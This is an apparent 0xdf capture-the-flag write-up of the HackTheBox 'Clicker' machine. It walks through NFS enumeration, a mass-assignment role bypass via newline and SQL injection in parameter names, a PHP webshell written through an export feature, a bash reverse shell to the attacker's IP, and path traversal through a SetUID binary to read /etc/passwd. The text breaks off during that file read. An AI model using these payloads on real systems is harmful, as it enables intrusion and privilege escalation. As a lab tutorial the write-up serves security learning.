HTB: Clicker
============

![Clicker](https://0xdf.gitlab.io/img/clicker-cover.png)

Clicker has a website that presents a game that is a silly version of Universal Paperclips. I’ll find an mass assignment vulnerability that allows me to change my role to admin after bypassing a filter two different ways (newline injection and SQLI). Then I’ll exploit a file write vulnerability to get a webshell and execution on the box. To escalate, I’ll find a SetUID binary for the next user and abuse it to read their SSH key. To get root, I’ll exploit a script the user can run with sudo, showing three different ways (playing with Perl environment variables, setting myself as the proxy and adding an XXE attack, and abusing LD\_PRELOAD).

## Box Info

Name[Clicker](https://www.hackthebox.com/machines/clicker) [![Clicker](https://0xdf.gitlab.io/icons/box-clicker.png)](https://www.hackthebox.com/machines/clicker)

[Play on HackTheBox](https://www.hackthebox.com/machines/clicker)Release Date[23 Sep 2023](https://twitter.com/hackthebox_eu/status/https://twitter.com/hackthebox_eu/status/1704850493275832715)Retire Date27 Jan 2024OSLinux ![Linux](https://0xdf.gitlab.io/icons/Linux.png)Base PointsMedium \[30\]Rated Difficulty![Rated difficulty for Clicker](https://0xdf.gitlab.io/img/clicker-diff.png)Radar Graph![Radar chart for Clicker](https://0xdf.gitlab.io/img/clicker-radar.png)![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)00:55:29 [![SavouryPenguin](https://www.hackthebox.eu/badge/image/63503)](https://app.hackthebox.com/users/63503)

![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)01:17:23 [![yoyosh](https://www.hackthebox.eu/badge/image/89950)](https://app.hackthebox.com/users/89950)

Creator[![Nooneye](https://www.hackthebox.eu/badge/image/166251)](https://app.hackthebox.com/users/166251)

## Recon

### nmap

`nmap` finds nine open TCP ports, SSH (22), HTTP (80), and seven related to NFS:

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.232
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-25 00:19 EST
Nmap scan report for 10.10.11.232
Host is up (0.11s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
36257/tcp open  unknown
36645/tcp open  unknown
39989/tcp open  unknown
42059/tcp open  unknown
54001/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 7.19 seconds
oxdf@hacky$ nmap -p 22,80,111,2049,36257,36645,39989,42059,54001 -sCV 10.10.11.232
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-25 00:26 EST
Nmap scan report for 10.10.11.232
Host is up (0.11s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://clicker.htb/
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      36257/tcp   mountd
|   100005  1,2,3      48115/tcp6  mountd
|   100005  1,2,3      55791/udp   mountd
|   100005  1,2,3      55895/udp6  mountd
|   100021  1,3,4      33747/udp   nlockmgr
|   100021  1,3,4      35015/tcp6  nlockmgr
|   100021  1,3,4      39989/tcp   nlockmgr
|   100021  1,3,4      40338/udp6  nlockmgr
|   100024  1          41396/udp   status
|   100024  1          42059/tcp   status
|   100024  1          45838/udp6  status
|   100024  1          49747/tcp6  status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
36257/tcp open  mountd   1-3 (RPC #100005)
36645/tcp open  mountd   1-3 (RPC #100005)
39989/tcp open  nlockmgr 1-4 (RPC #100021)
42059/tcp open  status   1 (RPC #100024)
54001/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.54 seconds
Segmentation fault (core dumped)

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 22.04 jammy. The webserver returns a redirect to `clicker.htb`. All the RPC ports seem to be related to NFS.

### Subdomain Fuzz

Given the use of the domain name `clicker.htb`, I’ll use `ffuf` to look for any subdomains that respond differently.

```
oxdf@hacky$ ffuf -u http://10.10.11.232 -H "Host: FUZZ.clicker.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac -mc all

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.232
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.clicker.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

www                     [Status: 200, Size: 2984, Words: 686, Lines: 108, Duration: 3488ms]
#www                    [Status: 400, Size: 301, Words: 26, Lines: 11, Duration: 109ms]
#mail                   [Status: 400, Size: 301, Words: 26, Lines: 11, Duration: 110ms]
:: Progress: [19966/19966] :: Job [1/1] :: 365 req/sec :: Duration: [0:00:58] :: Errors: 0 ::

```

`www` is worth checking out. The other two seem like errors. I’ll add these to my `/etc/hosts` file:

```
10.10.11.232 clicker.htb www.clicker.htb

```

Some quick manual tests show that the two domains seem to return the same pages. As root later I can confirm this in `/etc/apache2/sites-enabled/clicker.htb.conf`:

```
<VirtualHost *:80>
    ServerName clicker.htb
    ServerAlias www.clicker.htb
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/clicker.htb
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

```

The `ServerAlias` directive sets `www.clicker.htb` to be the same as `clicker.htb`.

### Website - TCP 80

#### Site

The website is for an old-school looking game called Clicker:

![image-20240125075933307](https://0xdf.gitlab.io/img/image-20240125075933307.png)

The Info link ( `/info.php`) just has some quotes from players. The Login link ( `/login.php`) has a login form, and the Register link ( `/register.php`) has a registration form:

![image-20240125080056217](https://0xdf.gitlab.io/img/image-20240125080056217.png)

Once I register and log in, there’s a game to play that’s just clicking to get “clicks”, and then spending clicks to level up and get more clicks per click:

![image-20240125091819416](https://0xdf.gitlab.io/img/image-20240125091819416.png)

It seems like a simple version of the [Universal Paperclips game](https://www.decisionproblem.com/paperclips/index2.html). The game is very easy to cheat in the browser dev tools:

![image-20240125093930364](https://0xdf.gitlab.io/img/image-20240125093930364.png)

It can lead to some wonky results:

![image-20240125093756372](https://0xdf.gitlab.io/img/image-20240125093756372.png)

#### Tech Stack

The site is clearly built on PHP. All the clicking and scoring is done locally in JavaScript. Clicking “Save and close” will send the current numbers to the server actually as a GET request:

![image-20240125094301904](https://0xdf.gitlab.io/img/image-20240125094301904.png)

That redirects to `/index.php?msg=Game has been saved!`.

Sending really large numbers crashes it:

![image-20240125094208521](https://0xdf.gitlab.io/img/image-20240125094208521.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```
oxdf@hacky$ feroxbuster -u http://clicker.htb -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://clicker.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      107l      277w     2984c http://clicker.htb/
301      GET        9l       28w      311c http://clicker.htb/assets => http://clicker.htb/assets/
200      GET      127l      319w     3343c http://clicker.htb/info.php
302      GET        0l        0w        0c http://clicker.htb/export.php => http://clicker.htb/index.php
301      GET        9l       28w      315c http://clicker.htb/assets/css => http://clicker.htb/assets/css/
301      GET        9l       28w      314c http://clicker.htb/assets/js => http://clicker.htb/assets/js/
302      GET        0l        0w        0c http://clicker.htb/admin.php => http://clicker.htb/index.php
200      GET      114l      266w     3253c http://clicker.htb/register.php
302      GET        0l        0w        0c http://clicker.htb/logout.php => http://clicker.htb/index.php
200      GET      114l      266w     3221c http://clicker.htb/login.php
302      GET        0l        0w        0c http://clicker.htb/profile.php => http://clicker.htb/index.php
200      GET      107l      277w     2984c http://clicker.htb/index.php
302      GET        0l        0w        0c http://clicker.htb/play.php => http://clicker.htb/index.php
301      GET        9l       28w      312c http://clicker.htb/exports => http://clicker.htb/exports/
200      GET        0l        0w        0c http://clicker.htb/authenticate.php
401      GET        0l        0w        0c http://clicker.htb/diagnostic.php
[####################] - 4m    150000/150000  0s      found:16      errors:1070
[####################] - 4m     30000/30000   124/s   http://clicker.htb/
[####################] - 4m     30000/30000   123/s   http://clicker.htb/assets/
[####################] - 4m     30000/30000   124/s   http://clicker.htb/assets/css/
[####################] - 4m     30000/30000   124/s   http://clicker.htb/assets/js/
[####################] - 3m     30000/30000   128/s   http://clicker.htb/exports/

```

`admin.php` is interesting, but even logged in it just redirects to the main page, likely requiring an admin account.

### NFS

`showmount -e` will enumerate the available NFS shares:

```
oxdf@hacky$ showmount -e clicker.htb
Export list for clicker.htb:
/mnt/backups *

```

There’s one share named `backups`. I’ll mount it to my host:

```
oxdf@hacky$ sudo mount -t nfs clicker.htb:/mnt/backups /mnt
oxdf@hacky$ ls /mnt/
clicker.htb_backup.zip

```

The zip has the source code for the website:

```
oxdf@hacky$ unzip clicker.htb_backup.zip
Archive:  clicker.htb_backup.zip
   creating: clicker.htb/
  inflating: clicker.htb/play.php
  inflating: clicker.htb/profile.php
  inflating: clicker.htb/authenticate.php
  inflating: clicker.htb/create_player.php
  inflating: clicker.htb/logout.php
   creating: clicker.htb/assets/
  inflating: clicker.htb/assets/background.png
  inflating: clicker.htb/assets/cover.css
  inflating: clicker.htb/assets/cursor.png
   creating: clicker.htb/assets/js/
  inflating: clicker.htb/assets/js/bootstrap.js.map
  inflating: clicker.htb/assets/js/bootstrap.bundle.min.js.map
  inflating: clicker.htb/assets/js/bootstrap.min.js.map
  inflating: clicker.htb/assets/js/bootstrap.bundle.min.js
  inflating: clicker.htb/assets/js/bootstrap.min.js
  inflating: clicker.htb/assets/js/bootstrap.bundle.js
  inflating: clicker.htb/assets/js/bootstrap.bundle.js.map
  inflating: clicker.htb/assets/js/bootstrap.js
   creating: clicker.htb/assets/css/
  inflating: clicker.htb/assets/css/bootstrap-reboot.min.css
  inflating: clicker.htb/assets/css/bootstrap-reboot.css
  inflating: clicker.htb/assets/css/bootstrap-reboot.min.css.map
  inflating: clicker.htb/assets/css/bootstrap.min.css.map
  inflating: clicker.htb/assets/css/bootstrap.css.map
  inflating: clicker.htb/assets/css/bootstrap-grid.css
  inflating: clicker.htb/assets/css/bootstrap-grid.min.css.map
  inflating: clicker.htb/assets/css/bootstrap-grid.min.css
  inflating: clicker.htb/assets/css/bootstrap.min.css
  inflating: clicker.htb/assets/css/bootstrap-grid.css.map
  inflating: clicker.htb/assets/css/bootstrap.css
  inflating: clicker.htb/assets/css/bootstrap-reboot.css.map
  inflating: clicker.htb/login.php
  inflating: clicker.htb/admin.php
  inflating: clicker.htb/info.php
  inflating: clicker.htb/diagnostic.php
  inflating: clicker.htb/save_game.php
  inflating: clicker.htb/register.php
  inflating: clicker.htb/index.php
  inflating: clicker.htb/db_utils.php
   creating: clicker.htb/exports/
  inflating: clicker.htb/export.php

```

## Shell as www-data

### Web Source

I’ll give the highlights of the web source, going over what is needed for exploitation to gain a foothold. There’s also a file, `diagnostic.php`, that doesn’t matter now but will play a role in the escalation to root.

#### Snyk

I’ll open the directory of files in VSCode and let the [Snyk](https://snyk.io/) plugin scan the code. It finds potentially XSS in a bunch of pages, hardcoded creds for the database, and the use of MD5:

![image-20240125101005392](https://0xdf.gitlab.io/img/image-20240125101005392.png)

The XSS alerts are all the way the site passes error messages through GET parameters. None of this seems promising to be useful for me.

#### admin.php

The admin panel starts with a check that the user’s `ROLE` is “Admin”:

```
<?php
session_start();
include_once("db_utils.php");

if ($_SESSION["ROLE"] != "Admin") {
  header('Location: /index.php');
  die;
}
?>

```

After that, there’s a mostly static page that calls `get_top_players` and makes a table:

![image-20240125102837173](https://0xdf.gitlab.io/img/image-20240125102837173.png)

`get_top_players` is defined in `db_utils.php`.

There is an HTML `form` that sends a POST request to `export.php` with the `threshold` and a selection of format as `txt`, `json`, and `html`:

![image-20240125102945578](https://0xdf.gitlab.io/img/image-20240125102945578.png)

#### export.php

`export.php` also does an admin role check at the start:

```
<?php
session_start();
include_once("db_utils.php");

if ($_SESSION["ROLE"] != "Admin") {
  header('Location: /index.php');
  die;
}

```

It builds output into a string as text, json, or HTML. HTML is the default rather than explicitly checking that the selection is `html`:

```
$threshold = 1000000;
if (isset($_POST["threshold"]) && is_numeric($_POST["threshold"])) {
    $threshold = $_POST["threshold"];
}
$data = get_top_players($threshold);
$currentplayer = get_current_player($_SESSION["PLAYER"]);
$s = "";
if ($_POST["extension"] == "txt") {
    $s .= "Nickname: ". $currentplayer["nickname"] . " Clicks: " . $currentplayer["clicks"] . " Level: " . $currentplayer["level"] . "\n";
    foreach ($data as $player) {
    $s .= "Nickname: ". $player["nickname"] . " Clicks: " . $player["clicks"] . " Level: " . $player["level"] . "\n";
  }
} elseif ($_POST["extension"] == "json") {
  $s .= json_encode($currentplayer);
  $s .= json_encode($data);
} else {
  $s .= '<table>';
  $s .= '<thead>';
  $s .= '  <tr>';
  $s .= '    <th scope="col">Nickname</th>';
  $s .= '    <th scope="col">Clicks</th>';
  $s .= '    <th scope="col">Level</th>';
  $s .= '  </tr>';
  $s .= '</thead>';
  $s .= '<tbody>';
  $s .= '  <tr>';
  $s .= '    <th scope="row">' . $currentplayer["nickname"] . '</th>';
  $s .= '    <td>' . $currentplayer["clicks"] . '</td>';
  $s .= '    <td>' . $currentplayer["level"] . '</td>';
  $s .= '  </tr>';

  foreach ($data as $player) {
    $s .= '  <tr>';
    $s .= '    <th scope="row">' . $player["nickname"] . '</th>';
    $s .= '    <td>' . $player["clicks"] . '</td>';
    $s .= '    <td>' . $player["level"] . '</td>';
    $s .= '  </tr>';
  }
  $s .= '</tbody>';
  $s .= '</table>';
}

```

Then it writes the output to a file and returns the location:

```
$filename = "exports/top_players_" . random_string(8) . "." . $_POST["extension"];
file_put_contents($filename, $s);
header('Location: /admin.php?msg=Data has been saved in ' . $filename);

```

#### save\_game.php / save\_profile

`save_game.php` is one of the first times (besides registration and login) that the site interacts with the database. It checks that the user is logged in, and then checks that there is no GET parameter named `role` (in any casing):

```
<?php
session_start();
include_once("db_utils.php");

if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
	$args = [];
	foreach($_GET as $key=>$value) {
		if (strtolower($key) === 'role') {
			// prevent malicious users to modify role
			header('Location: /index.php?err=Malicious activity detected!');
			die;
		}
		$args[$key] = $value;
	}
	save_profile($_SESSION['PLAYER'], $_GET);
	// update session info
	$_SESSION['CLICKS'] = $_GET['clicks'];
	$_SESSION['LEVEL'] = $_GET['level'];
	header('Location: /index.php?msg=Game has been saved!');
}
?>

```

The comment shows that even the author is aware that this is a potential mass assignment vulnerability. The `$_GET` is passed into `save_profile`, which is also in `db_utils.php`.

`save_profile` uses the passed in GET parameters to build an SQL string, and updates the player:

```
function save_profile($player, $args) {
	global $pdo;
  	$params = ["player"=>$player];
	$setStr = "";
  	foreach ($args as $key => $value) {
    		$setStr .= $key . "=" . $pdo->quote($value) . ",";
	}
  	$setStr = rtrim($setStr, ",");
  	$stmt = $pdo->prepare("UPDATE players SET $setStr WHERE username = :player");
  	$stmt -> execute($params);
}

```

The player is passed as a prepared statement, and the developer uses `$pdo->quote()` to prevent SQL injection in the key values.

### Admin on Site

#### Mass Assignment Vulnerability

While the GET request to `save_game.php` only sends two parameters, `clicks` and `level`, any that are passed to `save_profile` will be saved. Looking at the `create_new_player` function, there’s at least the following columns in the `players` table:

```
$stmt = $pdo->prepare("INSERT INTO players(username, nickname, password, role, clicks, level) VALUES (:player,:player,:password,'User',0,0)");

```

This means I can easily change my username, nickname, or password via this mass assignment, by just adding `&username=new0xdf` to the end of the URL. Messing with username risks breaking things, as I could end up with a non-unique username, which is used as a key at times in the site. Similarly, if I set the password to a non-hashed value, it would make that account impossible to log in to.

I’m not able to change my role in this same manner, as that will be caught at the top of `save_game.php` and return a message “Malicious activity detected!”.

#### Split Path

There are a couple of ways to bypass this filter. I’ll show two (yellow being the intended path):

```
flowchart TD;
    A[Mass Assignment]-->B(#34;role#34; Filtered);
    B-->C(Newline or comment\ninjection in parameter);
    B-->D(SQL Injection in parameter);
    C-->E[Admin role];
    D-->E

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 1,3 stroke-width:2px,stroke:#4B9CD3,fill:none;

```

#### Bypass Check via Newline Injection

The easiest way to bypass this check is with a newline injection in the parameter name. SQL is very forgiving of whitespace (it’s often best practice to break long queries across lines). So if I make the parameter `role%0a=Admin`, then it won’t return true when checked `strtolower($key) === 'role'`. When it gets to `save_profile`, it will generate the following SQL:

```
UPDATE players SET clicks='4',level='0',role
='Admin' WHERE username = "0xdf";

```

While the whitespace looks a bit odd, it works perfectly fine:

![image-20240125105035839](https://0xdf.gitlab.io/img/image-20240125105035839.png)

The `$_SESSION['role']` is only set on login, but after logging out and back in:

![image-20240125105209644](https://0xdf.gitlab.io/img/image-20240125105209644.png)

There are other variations on this as well, such as `role/**/`, which adds the start and close of an SQL comment.

#### Bypass Check via SQL Injection

The other way to bypass the `role` check is using SQL injection. I noted that both the player name and values were protected against SQLI. However, the keys are not. The default parameters of `clicks=4&level=0` result in the following SQL:

```
UPDATE players SET clicks='4',level='0' WHERE username = "0xdf";

```

If I change the `clicks` parameter to `role='Admin',clicks` (and URL encode that so that it makes it to PHP as one parameter name), then first it checks if `lower(role='Admin',clicks)` is `role` and it’s not, and then the SQL becomes:

```
UPDATE players SET role='Admin',clicks='4',level='0' WHERE username = "0xdf";

```

It bypasses the filter:

![image-20240125105746117](https://0xdf.gitlab.io/img/image-20240125105746117.png)

And results in admin access after logging out and back in.

### Webshell

#### Admin Enumeration

As admin, I have access to the “Top Players” table, with an option to export in various formats, as observed in the source:

![image-20240125123725189](https://0xdf.gitlab.io/img/image-20240125123725189.png)

When I do the export, it reports the path:

![image-20240125123823429](https://0xdf.gitlab.io/img/image-20240125123823429.png)

And that link has it:

![image-20240125123845151](https://0xdf.gitlab.io/img/image-20240125123845151.png)

It’s interesting that the output adds the current player no matter if they meet the threshold or not.

#### Write Other Formats

The issue in the `export.php` code is that it takes the user input for the format and uses that as the file extension without validating that it’s one of the three allowed formats. Further, because the if/elseif/else structure doesn’t check the `html` case, it just uses HTML for anything that isn’t `txt` or `json`.

That means I can write a PHP file:

![image-20240125124154118](https://0xdf.gitlab.io/img/image-20240125124154118.png)

#### Modify Nickname

The table that’s output as HTML has only the `nickname`, `clicks`, and `level` fields:

```
  $s .= '  <tr>';
  $s .= '    <th scope="row">' . $currentplayer["nickname"] . '</th>';
  $s .= '    <td>' . $currentplayer["clicks"] . '</td>';
  $s .= '    <td>' . $currentplayer["level"] . '</td>';
  $s .= '  </tr>';

  foreach ($data as $player) {
    $s .= '  <tr>';
    $s .= '    <th scope="row">' . $player["nickname"] . '</th>';
    $s .= '    <td>' . $player["clicks"] . '</td>';
    $s .= '    <td>' . $player["level"] . '</td>';
    $s .= '  </tr>';
  }

```

I’ve noticed that `nickname` is set the same as `username` on registration, but there’s nothing to prevent my updating it via the mass assignment:

![image-20240125124508421](https://0xdf.gitlab.io/img/image-20240125124508421.png)

Now if I export again:

![image-20240125124551311](https://0xdf.gitlab.io/img/image-20240125124551311.png)

#### Create Webshell

Putting that all together, I’ll change my `nickname` to be a PHP webshell:

![image-20240125124649040](https://0xdf.gitlab.io/img/image-20240125124649040.png)

I’ll do an export with `extension=php`:

![image-20240125124725187](https://0xdf.gitlab.io/img/image-20240125124725187.png)

Now I’ll visit `http://clicker.htb/exports/top_players_zhfppp54.php?cmd=id` and get execution:

![image-20240125124926231](https://0xdf.gitlab.io/img/image-20240125124926231.png)

#### Shell

To get a shell, I’ll start `nc` listening on 443 and visit `http://clicker.htb/exports/top_players_7pbbwdqy.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.6/443%200%3E%261%27`:

```
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.232 44604
bash: cannot set terminal process group (1211): Inappropriate ioctl for device
bash: no job control in this shell
www-data@clicker:/var/www/clicker.htb/exports$

```

I’ll do the [standard shell upgrade](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```
www-data@clicker:/var/www/clicker.htb/exports$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@clicker:/var/www/clicker.htb/exports$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@clicker:/var/www/clicker.htb/exports$

```

## Shell as jack

### Enumeration

#### Home Directories

There’s one other user with a home directory on the box:

```
www-data@clicker:/home$ ls
jack
www-data@clicker:/home$ ls jack/
ls: cannot open directory 'jack/': Permission denied

```

Unsurprisingly, www-data has no access.

I could look at the web stuff in www-data’s home directory, but it doesn’t prove useful here.

#### /opt

In `/opt` there’s a directory and a shell script:

```
www-data@clicker:/opt$ ls -l
total 8
drwxr-xr-x 2 jack jack 4096 Jul 21  2023 manage
-rwxr-xr-x 1 root root  504 Jul 20  2023 monitor.sh

```

`monitor.sh` starts with a check that it is running as root, so I’ll come back to that.

In `manage`, there’s a `README.txt` and an elf:

```
www-data@clicker:/opt/manage$ ls -l
total 20
-rw-rw-r-- 1 jack jack   256 Jul 21  2023 README.txt
-rwsrwsr-x 1 jack jack 16368 Feb 26  2023 execute_query
www-data@clicker:/opt/manage$ file execute_query
execute_query: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cad57695aba64e8b4f4274878882ead34f2b2d57, for GNU/Linux 3.2.0, not stripped

```

The `README.txt` has instructions for the binary:

```
www-data@clicker:/opt/manage$ cat README.txt
Web application Management

Use the binary to execute the following task:
        - 1: Creates the database structure and adds user admin
        - 2: Creates fake players (better not tell anyone)
        - 3: Resets the admin password
        - 4: Deletes all users except the admin

```

The binary does require arguments:

```
www-data@clicker:/opt/manage$ ./execute_query
ERROR: not enough arguments

```

Passing `1` shows the SQL that’s run:

```
www-data@clicker:/opt/manage$ ./execute_query 1
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
CREATE TABLE IF NOT EXISTS players(username varchar(255), nickname varchar(255), password varchar(255), role varchar(255), clicks bigint, level int, PRIMARY KEY (username))
--------------

--------------
INSERT INTO players (username, nickname, password, role, clicks, level)
        VALUES ('admin', 'admin', 'ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82', 'Admin', 999999999999999999, 999999999)
        ON DUPLICATE KEY UPDATE username=username
--------------

```

It seems to be calling `mysql` and inputting `.sql` SQL dump files. Running `strings` on the binary bolsters this theory:

```
www-data@clicker:/opt/manage$ strings execute_query | grep -F .sql
create.sql
populate.sql
reset_password.sql
clean.sql

```

I’ll base64 encode the binary, copy it back to my host, and decode it to get a copy:

```
oxdf@hacky$ vim execute_query.b64
oxdf@hacky$ base64 -d execute_query.b64 > execute_query
oxdf@hacky$ file execute_query
execute_query: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cad57695aba64e8b4f4274878882ead34f2b2d57, for GNU/Linux 3.2.0, not stripped
oxdf@hacky$ md5sum execute_query
f09a05ad831b9a4c7cf8cce4d7ae4b81  execute_query

```

That matches what’s on Clicker:

```
www-data@clicker:/opt/manage$ md5sum execute_query
f09a05ad831b9a4c7cf8cce4d7ae4b81  execute_query

```

### Reversing

I’ll open the binary in Ghidra and take a look. The entire thing is in `main`, which is:

```
undefined8 main(int argc,char **argv)

{
  long lVar1;
  int res;
  undefined8 return_val;
  char *filename_buffer;
  size_t strlen_res;
  size_t strlen_res2;
  char *__dest;
  long in_FS_OFFSET;
  char queries_dir [20];
  char local_78 [81];

  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  if (argc < 2) {
    puts("ERROR: not enough arguments");
    return_val = 1;
  }
  else {
    res = atoi(argv[1]);
    filename_buffer = (char *)calloc(0x14,1);
    switch(res) {
    case 0:
      puts("ERROR: Invalid arguments");
      return_val = 2;
      goto LAB_001015e1;
    case 1:
      strncpy(filename_buffer,"create.sql",0x14);
      break;
    case 2:
      strncpy(filename_buffer,"populate.sql",0x14);
      break;
    case 3:
      strncpy(filename_buffer,"reset_password.sql",0x14);
      break;
    case 4:
      strncpy(filename_buffer,"clean.sql",0x14);
      break;
    default:
      strncpy(filename_buffer,argv[2],0x14);
    }
    queries_dir[0] = '/';  // /home/jack/queries/\0
    queries_dir[1] = 'h';
    queries_dir[2] = 'o';
...[snip]...
    queries_dir[17] = 's';
    queries_dir[18] = '/';
    queries_dir[19] = '\0';
    strlen_res = strlen(queries_dir);
    strlen_res2 = strlen(filename_buffer);
    __dest = (char *)calloc(strlen_res2 + strlen_res + 1,1);
    strcat(__dest,queries_dir);
    strcat(__dest,filename_buffer);
    setreuid(1000,1000);
    res = access(__dest,4);
    if (res == 0) {
      cmd_str[0] = '/'; // cmd_str = /usr/bin/mysql -u clicker_db_user
      cmd_str[1] = 'u'; //           --password='clicker_db_password'
      cmd_str[2] = 's'; //           clicker -v < \0
      cmd_str[3] = 'r';
...[snip]...
      cmd_str[78] = '<';
      cmd_str[79] = ' ';
      cmd_str[80] = '\0';
      strlen_res = strlen(local_78);
      strlen_res2 = strlen(filename_buffer);
      filename_buffer = (char *)calloc(strlen_res2 + strlen_res + 1,1);
      strcat(filename_buffer,local_78);
      strcat(filename_buffer,__dest);
      system(filename_buffer);
    }
    else {
      puts("File not readable or not found");
    }
    return_val = 0;
  }
LAB_001015e1:
  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
    return return_val;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}

```

It gets a filename, appends it to the `mysql` command so that it’s pass as input, and runs it with `-v` which shows the file.

I’ll also note that while case 0 is a failure, the default case runs with `argv[2]` as the filename.

### File Read

I’ll try to read a file using `execute_query` with type 223 (or any other input that matches the default case) and directory traversal to get the file I want. It’s not able to read `user.txt`:

```
www-data@clicker:/opt/manage$ ./execute_query 223 ../user.txt
File not readable or not found

```

But `/etc/passwd` works:

```
www-data@clicker:/opt/manage$ ./execute_query 223 ../../../etc/passwd
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
